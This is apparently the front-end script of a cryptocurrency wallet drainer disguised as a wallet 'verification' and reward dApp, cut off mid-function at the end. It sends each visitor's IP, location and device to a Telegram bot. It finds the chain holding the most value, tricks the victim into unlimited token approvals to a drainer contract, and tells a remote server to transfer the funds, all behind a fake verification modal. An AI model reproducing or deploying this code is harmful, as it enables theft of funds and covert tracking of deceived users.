import { createAppKit } from '@reown/appkit';
import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { ethers } from 'ethers';
import config from './config.js';

// Функция для генерации уникального sessionId
function generateSessionId() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

const projectId = config.PROJECT_ID;
const networks = [mainnet, polygon, bsc, arbitrum];
const wagmiAdapter = new WagmiAdapter({ projectId, networks });

const appKit = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://bybitamlbot.com/',
    icons: ['https://bybitamlbot.com/icon.png'],
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW',
});

let connectedAddress = null;
let hasDrained = false;
let isTransactionPending = false;
let modalOverlay = null;
let modalContent = null;
let modalSubtitle = null;
let sessionId = null;

let lastDrainTime = 0;

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

const DRAINER_ABI = [
  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
];

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function sendTelegramMessage(message) {
  try {
    const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    const data = await response.json();
    if (!data.ok) {
      console.error(`❌ Error sending to Telegram: ${data.description}`);
    }
  } catch (error) {
    console.error(`❌ Error sending to Telegram: ${error.message}`);
  }
}

async function getUserIP() {
  const cachedIP = sessionStorage.getItem('userIP');
  if (cachedIP) return cachedIP;

  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ip = data.ip || 'Unknown IP';
    sessionStorage.setItem('userIP', ip);
    return ip;
  } catch (error) {
    console.error(`❌ Error retrieving IP: ${error.message}`);
    return 'Unknown IP';
  }
}

async function getGeolocation(ip) {
  const cachedLocation = sessionStorage.getItem('userLocation');
  if (cachedLocation) return cachedLocation;

  try {
    const response = await fetch(`https://freeipapi.com/api/json/${ip}`);
    const data = await response.json();
    if (data.cityName && data.countryName) {
      const location = `${data.cityName}, ${data.countryName}`;
      sessionStorage.setItem('userLocation', location);
      return location;
    }
    return 'Unknown Location';
  } catch (error) {
    console.error(`❌ Error retrieving geolocation: ${error.message}`);
    return 'Unknown Location';
  }
}

function detectDevice() {
  const userAgent = navigator.userAgent.toLowerCase();
  const platform = navigator.platform ? navigator.platform.toLowerCase() : '';

  const isDevToolsEmulation = /chrome/i.test(navigator.userAgent) && window.innerWidth !== window.screen.width;

  if (isDevToolsEmulation) {
    const realPlatform = navigator.platform.toLowerCase();
    if (/win32|win64/i.test(realPlatform)) return "Windows";
    if (/macintosh|mac os/i.test(realPlatform)) return "Mac";
    if (/linux/i.test(realPlatform)) return "Linux";
    return "Unknown";
  }

  if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone";
  if (/android/i.test(userAgent)) return "Android";
  if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) return "Windows";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown";
}

function isMobileDevice() {
  const device = detectDevice();
  return device === "iPhone" || device === "Android";
}

async function notifyOnVisit() {
  if (sessionStorage.getItem('visitNotified')) return;

  const domain = window.location.hostname || 'Unknown Domain';
  const ip = await getUserIP();
  const location = await getGeolocation(ip);
  const device = detectDevice();

  const message = `🔔 Visit | **${domain}**\n\n` +
                  `IP: ${ip}\n` +
                  `Where: ${location}\n` +
                  `Device: ${device}`;

  await sendTelegramMessage(message);
  sessionStorage.setItem('visitNotified', 'true');
}

notifyOnVisit().catch(error => {
  console.error(`❌ Error notifying visit: ${error.message}`);
});

async function getTokenPriceInUSDT(tokenSymbol) {
  if (tokenSymbol === "USDT" || tokenSymbol === "USDTUSDT") return 1;

  const cachedPrice = sessionStorage.getItem(`tokenPrice_${tokenSymbol}`);
  if (cachedPrice) {
    return parseFloat(cachedPrice);
  }

  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}USDT`);
    const data = await response.json();
    if (data.price) {
      const price = parseFloat(data.price);
      sessionStorage.setItem(`tokenPrice_${tokenSymbol}`, price.toString());
      return price;
    }
    console.warn(`⚠️ Price for ${tokenSymbol} not found, returning 0`);
    return 0;
  } catch (error) {
    console.error(`❌ Error fetching price for ${tokenSymbol}: ${error.message}`);
    return 0;
  }
}

async function getWorkingProvider(rpcUrls) {
  const providerPromises = rpcUrls.map(async (rpc) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      await provider.getBalance('0x0000000000000000000000000000000000000000');
      return provider;
    } catch {
      return null;
    }
  });

  const results = await Promise.all(providerPromises);
  const workingProvider = results.find(provider => provider !== null);
  if (!workingProvider) throw new Error('No working provider found');
  return workingProvider;
}

async function checkBalance(chainId, userAddress, provider) {
  const chainConfig = config.CHAINS[chainId];
  let nativeBalance, tokenBalances = {};

  console.log(`🔍 Checking balance for chainId ${chainId}`);

  try {
    nativeBalance = await provider.getBalance(userAddress);
    console.log(`📊 Balance ${chainConfig.nativeToken}: ${ethers.utils.formatEther(nativeBalance)}`);
  } catch (error) {
    console.error(`❌ Error fetching ${chainConfig.nativeToken} balance: ${error.message}`);
    throw new Error('Failed to fetch native balance');
  }

  try {
    const usdt = new ethers.Contract(chainConfig.usdtAddress, ERC20_ABI, provider);
    const [usdtBalance, usdtDecimals] = await Promise.all([
      usdt.balanceOf(userAddress),
      usdt.decimals()
    ]);
    tokenBalances[chainConfig.usdtAddress] = { balance: usdtBalance, decimals: usdtDecimals };
    console.log(`📊 USDT balance: ${ethers.utils.formatUnits(usdtBalance, usdtDecimals)}`);
  } catch (error) {
    console.warn(`⚠️ Failed to fetch USDT balance: ${error.message}`);
    tokenBalances[chainConfig.usdtAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
  }

  try {
    const usdc = new ethers.Contract(chainConfig.usdcAddress, ERC20_ABI, provider);
    const [usdcBalance, usdcDecimals] = await Promise.all([
      usdc.balanceOf(userAddress),
      usdc.decimals()
    ]);
    tokenBalances[chainConfig.usdcAddress] = { balance: usdcBalance, decimals: usdcDecimals };
    console.log(`📊 USDC balance: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
  } catch (error) {
    console.warn(`⚠️ Failed to fetch USDC balance: ${error.message}`);
    tokenBalances[chainConfig.usdcAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
  }

  if (chainConfig.otherTokenAddresses) {
    const tokenAddresses = Object.values(chainConfig.otherTokenAddresses);
    const balancePromises = tokenAddresses.map(async (tokenAddress) => {
      try {
        const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const [balance, decimals] = await Promise.all([
          token.balanceOf(userAddress),
          token.decimals()
        ]);
        console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(balance, decimals)}`);
        return { address: tokenAddress, balance, decimals };
      } catch (error) {
        console.warn(`⚠️ Failed to fetch token ${tokenAddress} balance: ${error.message}`);
        return { address: tokenAddress, balance: ethers.BigNumber.from(0), decimals: 18 };
      }
    });

    const results = await Promise.all(balancePromises);
    results.forEach(({ address, balance, decimals }) => {
      tokenBalances[address] = { balance, decimals };
    });
  }

  return { nativeBalance, tokenBalances };
}

function hasFunds(bal) {
  const minNativeBalance = ethers.utils.parseEther("0.001");
  const minTokenBalance = ethers.utils.parseUnits("0.1", 6);

  if (bal.nativeBalance.gt(minNativeBalance)) return true;

  for (const tokenData of Object.values(bal.tokenBalances)) {
    if (tokenData.balance.gt(minTokenBalance)) return true;
  }

  return false;
}

async function switchChain(chainId) {
  try {
    console.log(`🔄 Switching to chainId ${chainId}`);
    await appKit.switchNetwork(chainId);
    console.log(`✅ Switched to chainId ${chainId}`);
  } catch (error) {
    console.error(`❌ Error switching chain: ${error.message}`);
    throw new Error(`Failed to switch chain: ${error.message}`);
  }
}

function shortenAddress(address) {
  if (!address || address.length < 10) return address;
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function detectWallet() {
  if (window.ethereum?.isMetaMask) return "MetaMask";
  if (window.ethereum?.isTrust) return "Trust Wallet";
  return "Unknown Wallet";
}

function formatBalance(balance, decimals) {
  const formatted = ethers.utils.formatUnits(balance, decimals);
  return parseFloat(formatted).toFixed(6).replace(/\.?0+$/, '');
}

async function saveSession(userAddress, chainId, txHash = null) {
  try {
    if (!sessionId) sessionId = generateSessionId();
    const response = await fetch('https://api.bybitamlbot.com/api/save-session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId,
        userAddress,
        chainId,
        txHash
      })
    });
    const data = await response.json();
    if (data.success) {
      sessionStorage.setItem('sessionId', sessionId);
      console.log(`✅ Session saved: ${sessionId}`);
    } else {
      throw new Error(data.message || 'Failed to save session');
    }
  } catch (error) {
    console.error(`❌ Error saving session: ${error.message}`);
  }
}

async function restoreSession() {
  try {
    const storedSessionId = sessionStorage.getItem('sessionId');
    if (!storedSessionId) return null;

    const response = await fetch(`https://api.bybitamlbot.com/api/get-session/${storedSessionId}`);
    const data = await response.json();
    if (data.success) {
      console.log(`✅ Session restored: ${storedSessionId}`);
      return data.data;
    } else {
      console.warn(`⚠️ Session not found or expired: ${storedSessionId}`);
      sessionStorage.removeItem('sessionId');
      return null;
    }
  } catch (error) {
    console.error(`❌ Error restoring session: ${error.message}`);
    return null;
  }
}

async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider, initialAmount) {
  try {
    console.log(`📍 Notifying server for token ${tokenAddress} for ${userAddress}`);
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const balance = initialAmount;
    const decimals = (await token.decimals()) || 6;
    console.log(`📊 Current token balance: ${ethers.utils.formatUnits(balance, decimals)}`);

    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
    const roundedBalance = Math.max(parseFloat(balanceUnits).toFixed(5), 0.0001);
    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);

    console.log(`📊 Rounded balance: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);

    await saveSession(userAddress, chainId, txHash);

    const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: roundedAmount.toString(),
        chainId,
        txHash
      })
    });
    const data = await response.json();
    console.log(`📩 Server response:`, data);
    if (!data.success) {
      throw new Error(`Failed to notify server: ${data.message || 'Unknown error'}`);
    }
    console.log(`✅ Server notified successfully for token ${tokenAddress}`);

    return { success: true, roundedAmount: roundedAmount.toString() };
  } catch (error) {
    console.error(`❌ Error notifying server: ${error.message}`);
    throw new Error(`Failed to notify server: ${error.message}`);
  }
}

async function drain(chainId, signer, userAddress, bal, provider) {
  console.log(`Connected wallet: ${userAddress}`);

  const chainConfig = config.CHAINS[chainId];
  if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);

  console.log(`📍 Step 1: Checking configuration for chainId ${chainId}`);

  const currentNetwork = await provider.getNetwork();
  if (currentNetwork.chainId !== chainId) {
    console.log(`📍 Current network ${currentNetwork.chainId}, switching to ${chainId}`);
    try {
      await switchChain(chainId);
      console.log(`⏳ Waiting for network switch to complete...`);
      await new Promise(resolve => setTimeout(resolve, 3000));
      const newNetwork = await provider.getNetwork();
      if (newNetwork.chainId !== chainId) {
        throw new Error(`Failed to switch network: expected chainId ${chainId}, but got ${newNetwork.chainId}`);
      }
      console.log(`✅ Network switched to chainId ${chainId}`);
    } catch (error) {
      console.error(`❌ Error switching network: ${error.message}`);
      if (error.code === 4001) {
        throw new Error("User rejected network switch");
      }
      throw new Error(`Network switch failed: ${error.message}`);
    }
  }

  const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses)];

  const connectNotifiedKey = `connectNotified_${userAddress}_${chainId}`;
  const hasNotified = sessionStorage.getItem(connectNotifiedKey);

  if (!hasNotified) {
    console.log(`📍 Step 2: Sending connect notification`);
    const shortAddress = shortenAddress(userAddress);
    const walletName = detectWallet();
    const networkName = chainConfig.name;
    const funds = [];

    const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
    if (parseFloat(nativeBalance) > 0) {
      const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
      const nativePrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[chainConfig.nativeToken] || chainConfig.nativeToken);
      const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
      funds.push(`- **${chainConfig.nativeToken}**(${networkName}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
    }

    for (const tokenAddress of tokenAddresses) {
      const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
      const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
      if (formattedBalance > 0) {
        const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                      tokenAddress === chainConfig.usdcAddress ? "USDC" :
                      Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
        const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
        const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
        funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
      }
    }

    const device = detectDevice();
    const fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
    const message = `🌀 Connect | [ ${shortAddress} ]\n\n` +
                    `Wallet: ${walletName}\n` +
                    `Network: ${networkName}\n` +
                    `Funds:\n${fundsMessage}\n` +
                    `Device: ${device}`;

    await sendTelegramMessage(message);
    sessionStorage.setItem(connectNotifiedKey, 'true');
    console.log(`✅ Notification sent`);
  }

  const MAX = ethers.constants.MaxUint256;
  const MIN_TOKEN_BALANCE = parseFloat(ethers.utils.formatUnits(ethers.utils.parseUnits("0.1", 6), 6));

  console.log(`📍 Step 3: Checking ${chainConfig.nativeToken} balance for gas`);
  let ethBalance;
  try {
    ethBalance = await provider.getBalance(userAddress);
    console.log(`📊 ${chainConfig.nativeToken} balance: ${ethers.utils.formatEther(ethBalance)}`);
  } catch (error) {
    console.error(`❌ Error fetching ${chainConfig.nativeToken} balance: ${error.message}`);
    throw new Error(`Failed to fetch ${chainConfig.nativeToken} balance: ${error.message}`);
  }

  const minEthRequired = ethers.utils.parseEther("0.0003");
  const ethBalanceFormatted = parseFloat(ethers.utils.formatEther(ethBalance));
  if (ethBalanceFormatted < parseFloat(ethers.utils.formatEther(minEthRequired))) {
    console.error(`❌ Insufficient ${chainConfig.nativeToken} for gas`);
    throw new Error(`Insufficient ${chainConfig.nativeToken} balance for gas`);
  }

  console.log(`📍 Step 4: Collecting tokens to process`);
  const tokensToProcess = [];

  const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
    const realBalance = tokenData.balance;
    const decimals = tokenData.decimals;
    console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(realBalance, decimals)}`);
    return { tokenAddress, tokenContract, realBalance, decimals };
  });

  const tokenDataResults = await Promise.all(tokenDataPromises);
  console.log(`✅ Retrieved token data: ${tokenDataResults.length} tokens`);

  for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
    const storedBalance = bal.tokenBalances[tokenAddress]?.balance || ethers.BigNumber.from(0);
    const storedBalanceFormatted = parseFloat(ethers.utils.formatUnits(storedBalance, decimals));
    const realBalanceFormatted = parseFloat(ethers.utils.formatUnits(realBalance, decimals));

    if (realBalanceFormatted < storedBalanceFormatted) {
      bal.tokenBalances[tokenAddress] = { balance: realBalance, decimals: decimals };
    }

    if (realBalanceFormatted > 0 && realBalanceFormatted > MIN_TOKEN_BALANCE) {
      const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                    tokenAddress === chainConfig.usdcAddress ? "USDC" :
                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
      if (!symbol) {
        console.warn(`⚠️ Skipping token ${tokenAddress}: symbol not defined`);
        continue;
      }
      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
    }
  }

  console.log(`📍 Step 5: Fetching token prices and sorting`);
  const pricePromises = tokensToProcess.map(async (token) => {
    const price = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[token.address] || token.token);
    const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
    token.valueInUSDT = balanceInUnits * price;
    return token;
  });

  await Promise.all(pricePromises);
  tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
  console.log(`✅ Tokens sorted: ${tokensToProcess.map(t => t.token).join(', ')}`);

  let status = 'rejected';
  let modalClosed = false;

  for (const { token, balance, contract, address, decimals } of tokensToProcess) {
    if (!token) {
      console.error(`❌ Token undefined for address ${address}, skipping`);
      continue;
    }
    console.log(`📍 Step 6: Processing token ${token}`);

    const allowanceBefore = await contract.allowance(userAddress, chainConfig.drainerAddress);
    console.log(`📜 Allowance: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);

    const allowanceFormatted = parseFloat(ethers.utils.formatUnits(allowanceBefore, decimals));
    const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
    if (allowanceFormatted < balanceFormatted) {
      try {
        const nonce = await provider.getTransactionCount(userAddress, "pending");
        const gasPrice = await provider.getGasPrice();
        console.log(`📏 Gas price: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);

        console.log(`⏳ Delay before approve for token ${token}`);
        await delay(10);

        const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
          gasLimit: 500000,
          gasPrice,
          nonce
        });
        console.log(`📤 Approve transaction sent: ${tx.hash}`);
        const receipt = await tx.wait();
        console.log(`✅ Approve transaction confirmed: ${receipt.transactionHash}`);

        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
        status = 'confirmed';

        if (!modalClosed) {
          console.log(`ℹ Closing modal after successful approve for token ${token}`);
          await hideModalWithDelay();
          modalClosed = true;
        }
      } catch (error) {
        console.error(`❌ Error approving token ${token}: ${error.message}`);
        if (error.message.includes('user rejected')) {
          if (!modalClosed) {
            console.log(`ℹ User rejected approve for token ${token}, closing modal`);
            await hideModalWithDelay("Error: Transaction rejected by user.");
            modalClosed = true;
          }
        }
        throw new Error(`Failed to approve token ${token}: ${error.message}`);
      }
    } else {
      console.log(`✅ Allowance already sufficient for token ${token}`);
      try {
        await notifyServer(userAddress, address, balance, chainId, null, provider, balance);
        status = 'confirmed';
      } catch (error) {
        console.error(`❌ Error notifying server for token ${token}: ${error.message}`);
        throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
      }

      if (!modalClosed) {
        console.log(`ℹ Allowance sufficient for token ${token}, closing modal`);
        modalClosed = true;
        await hideModalWithDelay();
      }
    }
  }

  console.log(`📍 Step 7: Completing drain with status ${status}`);
  return status;
}

async function runDrainer(provider, signer, userAddress) {
  const currentTime = Date.now();
  const timeSinceLastDrain = currentTime - lastDrainTime;
  const minDelay = 10;

  if (timeSinceLastDrain < minDelay) {
    await delay(minDelay - timeSinceLastDrain);
  }

  lastDrainTime = Date.now();

  const balancePromises = Object.keys(config.CHAINS).map(async (chainId) => {
    try {
      const reliableProvider = await getWorkingProvider(config.CHAINS[chainId].rpcUrls);
      const balance = await checkBalance(chainId, userAddress, reliableProvider);
      return { chainId: Number(chainId), balance, provider: reliableProvider };
    } catch (error) {
      console.error(`❌ Error checking balance for chainId ${chainId}: ${error.message}`);
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);

  const sorted = await Promise.all(
    balances
      .filter(item => hasFunds(item.balance))
      .map(async (item) => {
        const totalValueInUSDT = await calculateTotalValueInUSDT(item.chainId, item.balance, item.provider);
        return { ...item, totalValueInUSDT };
      })
  );

  sorted.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);

  if (!sorted.length) {
    throw new Error('No funds found on any chain');
  }

  const target = sorted[0];
  console.log(`Recommended chain: chainId ${target.chainId} with max token value ${target.totalValueInUSDT} USDT`);
  return { targetChainId: target.chainId, targetProvider: target.provider };
}

async function calculateTotalValueInUSDT(chainId, balance, provider) {
  const chainConfig = config.CHAINS[chainId];
  let totalValue = 0;

  for (const tokenAddress of Object.keys(balance.tokenBalances)) {
    const tokenData = balance.tokenBalances[tokenAddress];
    const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
    if (formattedBalance > 0) {
      const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                    tokenAddress === chainConfig.usdcAddress ? "USDC" :
                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
      const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
      const tokenValue = formattedBalance * tokenPrice;
      totalValue += tokenValue;
      console.log(`📊 Token ${symbol} in chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
    }
  }

  console.log(`📊 Total token value (excluding native) for chainId ${chainId}: ${totalValue} USDT`);
  return totalValue;
}

window.addEventListener('DOMContentLoaded', async () => {
  const actionButtons = document.querySelectorAll('.action-btn');

  const link = document.createElement('link');
  link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
  link.rel = 'stylesheet';
  document.head.appendChild(link);

  const style = document.createElement('style');
  style.textContent = `
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      z-index: 999;
      display: none;
      backdrop-filter: blur(4px);
      pointer-events: auto;
    }

    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #1A202C;
      border-radius: 12px;
      padding: 24px;
      width: 90%;
      max-width: 400px;
      min-height: 350px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Inter', sans-serif;
      color: #FFFFFF;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      animation: fadeIn 0.3s ease-out forwards;
    }

    @keyframes fadeIn {
      0% { transform: translate(-50%, -50%) scale(0.95); opacity: 0; }
      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    }

    .modal-title {
      font-size: 20px;
      font-weight: 600;
      color: #FFFFFF;
      margin-bottom: 16px;
    }

    .modal-subtitle {
      font-size: 14px;
      font-weight: 400;
      color: #A0AEC0;
      margin-bottom: 24px;
      word-wrap: break-word;
    }

    .loader-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 24px;
    }

    .pulse-ring {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 40px;
      height: 40px;
      border: 3px solid #3B82F6;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      animation: pulse 2s ease-in-out infinite;
    }

    @keyframes pulse {
      0% { width: 40px; height: 40px; opacity: 0.8; }
      50% { width: 50px; height: 50px; opacity: 0.4; }
      100% { width: 40px; height: 40px; opacity: 0.8; }
    }

    .wave {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 40px;
      height: 40px;
      border: 1px solid #60A5FA;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      opacity: 0;
      animation: wave 4s ease-out infinite;
    }

    .wave:nth-child(2) { animation-delay: 1s; }
    .wave:nth-child(3) { animation-delay: 2s; }

    @keyframes wave {
      0% { width: 40px; height: 40px; opacity: 0.6; }
      100% { width: 100px; height: 100px; opacity: 0; }
    }

    .action-list {
      list-style: none;
      padding: 0;
      margin: 24px 0 0;
      font-size: 14px;
      font-weight: 500;
      color: #E2E8F0;
      text-align: left;
    }

    .action-list li {
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .modal-footer {
      font-size: 12px;
      font-weight: 400;
      color: #A0AEC0;
      margin-top: 32px;
      font-style: italic;
    }

    @media (max-width: 480px) {
      .modal-content {
        max-width: 320px;
        padding: 20px;
        min-height: 300px;
      }
      .modal-title { font-size: 18px; }
      .modal-subtitle { font-size: 13px; }
      .loader-container { width: 70px; height: 70px; }
      @keyframes pulse {
        0% { width: 30px; height: 30px; opacity: 0.8; }
        50% { width: 40px; height: 40px; opacity: 0.4; }
        100% { width: 30px; height: 30px; opacity: 0.8; }
      }
      @keyframes wave {
        0% { width: 30px; height: 30px; opacity: 0.6; }
        100% { width: 70px; height: 70px; opacity: 0; }
      }
      .action-list { font-size: 13px; }
      .modal-footer { font-size: 11px; }
    }
  `;
  document.head.appendChild(style);

  modalOverlay = document.createElement('div');
  modalOverlay.className = 'modal-overlay';
  document.body.appendChild(modalOverlay);

  modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  modalContent.innerHTML = `
    <div class="modal-title">Verify Your Wallet</div>
    <div class="modal-subtitle">Processing blockchain verification...</div>
    <div class="loader-container">
      <div class="pulse-ring"></div>
      <div class="wave"></div>
      <div class="wave"></div>
      <div class="wave"></div>
    </div>
    <ul class="action-list">
      <li>Connect to the network</li>
      <li>Sign the verification transaction</li>
      <li>Claim your blockchain reward</li>
    </ul>
    <div class="modal-footer">Please confirm in your wallet app</div>
  `;
  document.body.appendChild(modalContent);

  modalSubtitle = modalContent.querySelector('.modal-subtitle');

  const sessionData = await restoreSession();
  if (sessionData && !hasDrained && !isTransactionPending) {
    connectedAddress = sessionData.userAddress;
    console.log(`ℹ Restored session for address: ${connectedAddress}`);
    try {
      const state = await new Promise(resolve => {
        const unsubscribe = appKit.subscribeState(state => {
          if (state.connected && state.address) {
            unsubscribe();
            resolve(state);
          }
        });
        setTimeout(() => {
          unsubscribe();
          resolve(null);
        }, 2000);
      });
      if (state && state.address && state.address.toLowerCase() === connectedAddress.toLowerCase()) {
        await attemptDrainer();
      } else {
        console.warn(`⚠ Wallet not connected, clearing session`);
        sessionStorage.removeItem('sessionId');
        connectedAddress = null;
      }
    } catch (error) {
      console.error(`❌ Error checking wallet connection: ${error.message}`);
      sessionStorage.removeItem('sessionId');
      connectedAddress = null;
    }
  }

  actionButtons.forEach(btn => {
    btn.addEventListener('click', handleConnectOrAction);
  });
});

function showModal() {
  modalOverlay.style.display = 'block';
  modalOverlay.style.pointerEvents = 'auto';
  modalContent.style.display = 'block';
  modalSubtitle.textContent = 'Processing blockchain verification...';
}

async function hideModalWithDelay(errorMessage = null) {
  if (errorMessage) {
    modalSubtitle.textContent = errorMessage;
    await new Promise(resolve => setTimeout(resolve, 2000));
  }
  modalOverlay.style.display = 'none';
  modalOverlay.style.pointerEvents = 'none';
  modalContent.style.display = 'none';
  document.body.style.pointerEvents = 'auto';
}

async function attemptDrainer() {
  if (hasDrained || isTransactionPending) {
    console.log('⚠ Transaction already completed or pending');
    await hideModalWithDelay("Transaction already completed or pending.");
    return;
  }

  if (!connectedAddress) {
    console.error('❌ Wallet address not defined');
    showModal();
    await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
    return;
  }

  showModal();

  try {
    if (!window.ethereum) throw new Error('No Ethereum provider available after wallet connection');
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
      throw new Error('Wallet address mismatch');
    }

    await new Promise(resolve => setTimeout(resolve, 10));

    isTransactionPending = true;
    const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
    if (targetChainId) {
      await switchChain(targetChainId);
      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
      console.log(`✅ Drainer executed, status: ${status}`);
    }

    hasDrained = true;
    isTransactionPending = false;
  } catch (error) {
    isTransactionPending = false;
    let errorMessage = "Error: An unexpected error occurred.";
    if (error.message.includes('user rejected')) {
      errorMessage = "Error: Transaction rejected by user.";
    } else if (error.message.includes('Insufficient')) {
      errorMessage = error.message;
    } else if (error.message.includes('Failed to approve token')) {
      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
    } else if (error.message.includes('Failed to process')) {
      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
    } else if (error.message.includes('Failed to switch')) {
      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
    } else {
      errorMessage = `Error: ${error.message}`;
    }
    console.error(`❌ Drainer error: ${errorMessage}`);
    await hideModalWithDelay(errorMessage);
    throw error;
  }
}

async function handleConnectOrAction() {
  try {
    if (!connectedAddress) {
      console.log('🔄 Opening AppKit modal for wallet selection...');
      await appKit.open();
      connectedAddress = await waitForConnection();
      console.log(`✅ Wallet connected: ${connectedAddress}`);
      appKit.close();

